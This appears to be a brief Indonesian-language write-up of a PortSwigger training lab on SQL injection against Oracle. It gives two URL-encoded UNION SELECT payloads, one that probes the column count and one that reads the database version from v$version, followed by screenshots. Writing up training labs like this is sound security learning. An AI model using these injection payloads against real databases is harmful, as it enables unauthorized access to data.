# - Lab: SQL injection attack, querying the database type and version on Oracle
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

# - Link
https://portswigger.net/web-security/sql-injection/lab-querying-database-version-oracle

# - Cara

## Step
1. Cek adanya dua kolom dengan ```sql '+UNION+SELECT+'abc','def'+FROM+dual--```
2. Dan masukkan payload ini untuk cek versi ```sql '+UNION+SELECT+BANNER,+NULL+FROM+v$version--```

## Gambar
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_11_40_30" src="https://github.com/user-attachments/assets/76f4bd7c-b54c-4576-ae3d-11493214a267" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_11_41_22" src="https://github.com/user-attachments/assets/57fb9aa2-eaed-46a4-9b9f-52b53afd1a26" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_17_09_2025_11_42_02" src="https://github.com/user-attachments/assets/e64299db-53fe-443d-a905-e92cdba7f952" />

## Berhasil


